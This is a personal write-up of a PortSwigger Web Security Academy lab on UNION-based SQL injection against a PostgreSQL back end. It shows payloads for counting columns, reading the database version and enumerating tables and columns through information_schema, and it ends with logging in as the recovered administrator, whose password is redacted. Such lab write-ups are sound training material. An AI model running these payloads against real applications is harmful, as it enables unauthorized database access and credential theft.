# Lab: SQL Injection – Listing the Database Contents on Non-Oracle Databases

**Platform:** PortSwigger Web Security Academy  
**Vulnerability:** SQL Injection (UNION-based)

## Objectives

1. Find the database name and type.
    
2. Find the table containing usernames and passwords.
    
3. Retrieve the administrator's username and password.
    
4. Log in as the administrator.
    

## My Approach

### 1. Checking the number of columns

First, I tried to find the number of columns in the original SQL query.

**Payload:**

```
ORDER BY 3--
```

**Result:** The application returned a 500 Internal Server Error.

### 2. Finding the database type and version

I used the `version()` function to identify the database.

**Payload:**

```
UNION SELECT version(), NULL--
```

**Result:**

```
PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4)
on x86_64-pc-linux-gnu
```

The database was PostgreSQL.

### 3. Finding the table names

Next, I used `information_schema.tables` to list the available table names.

**Payload:**

```
UNION SELECT table_name, NULL
FROM information_schema.tables--
```

**Found table:**

```
users_ijafxf
```

This table looked like the one containing user credentials.

### 4. Finding the column names

After finding the table, I checked its columns using `information_schema.columns`.

**Payload:**

```
UNION SELECT column_name, NULL
FROM information_schema.columns
WHERE table_name = 'users_ijafxf'--
```

**Found columns:**

- Username: `username_uignch`
    
- Password: `password_cqiycd`
    

### 5. Retrieving the administrator credentials

After identifying the table and its columns, I retrieved the stored credentials.

**Username:** `administrator`

**Password:** `[Redacted – recovered during the lab]`

### 6. Final step

Used the recovered administrator credentials to log in to the application and complete the lab.

## Key Learnings

- Learned how to identify a database using the `version()` function.
    
- Learned how to find table names using `information_schema.tables`.
    
- Learned how to find column names using `information_schema.columns`.
    
- Practiced extracting information using UNION-based SQL injection.
    
- Understood how database metadata can help identify where sensitive information is stored.
    

**Lab Status:** Completed